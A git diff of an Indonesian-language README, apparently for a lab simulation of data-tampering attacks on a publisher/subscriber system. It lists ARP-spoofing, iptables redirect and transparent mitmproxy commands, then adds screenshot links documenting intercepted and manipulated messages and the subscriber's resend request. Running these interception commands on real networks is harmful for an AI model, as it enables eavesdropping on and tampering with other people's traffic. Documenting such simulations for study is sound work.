@@ -13,10 +13,31 @@ Sebelum memulai tahapan ini, perangkat manapun yang ditargetkan diharuskan telah
    1. sudo sysctl net.ipv4.ip_forward=1
    2. sudo sysctl -w net.ipv4.conf.all.send_redirects=0
    3. sudo arpspoof -i eth0 -r -t [isi-IP-Target] [isi-IP-Router]
-
+      
 - setelah proses ARP Spoofing berhasil dijalankan, selanjutnya dilakukan perintah berikut:
    1. sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport [isi-Port-target] -j REDIRECT --to-port 8081
    2. mitmproxy --mode transparent --showhost -p 8081 -k --tcp-hosts ".*"
 - Reference related to use MITM tools: https://github.com/nmatt0/mitmtools
   
-- Setelahnya akan diarahkan ke flows panel pada tools MITM Proxy, didalam flows panel tersebut akan terdapat isi komunikasi yang dilakukan oleh target. dan untuk melakukan intercept pada salah satu data komunikasi diperlukan menggunakan perintah: ~b [isi-format-topik-data-target] . 
+- Setelahnya akan diarahkan ke flows panel pada tools MITM Proxy, didalam flows panel tersebut akan terdapat isi komunikasi yang dilakukan oleh target. dan untuk melakukan intercept pada salah satu data komunikasi diperlukan menggunakan perintah: ~b [isi-format-topik-data-target] .
+<img width="462" height="101" alt="image" src="https://github.com/user-attachments/assets/614ecd35-73fc-4b74-b1c0-8834673a2fab" />
+
+# Hasil Dokumentasi
+# Dokumentasi proses simulasi serangan Data Tampering [Data Intercepted]
+<img width="670" height="48" alt="image" src="https://github.com/user-attachments/assets/22488fbc-4126-49fd-834d-adb71e537d63" />
+
+# Dokumentasi proses simulasi serangan Data Tampering [Data Manipulated]
+<img width="677" height="59" alt="image" src="https://github.com/user-attachments/assets/5b8db702-6468-45e9-9408-62bb78835a91" />
+
+# Dokumentasi proses yang terjadi setelah Data dimanipulasi [UI dashboard Subscriber]
+<img width="702" height="339" alt="image" src="https://github.com/user-attachments/assets/9ecc8818-f55d-406b-9144-2fad84da8717" />
+
+# Dokumentasi subscriber melakukan request pengiriman ulang data ke publisher [Log Data Subscriber]
+<img width="214" height="478" alt="image" src="https://github.com/user-attachments/assets/9532a5b0-e02f-4d2d-8dd4-92c181834672" />
+
+# Dokumentasi publisher mengerimkan ulang data yang direquest oleh subsrcriber [Log Serial Monitor Publisher]
+<img width="699" height="161" alt="image" src="https://github.com/user-attachments/assets/248b5ff7-1115-47d2-9157-29b4c11a512f" />
+
+
+
+
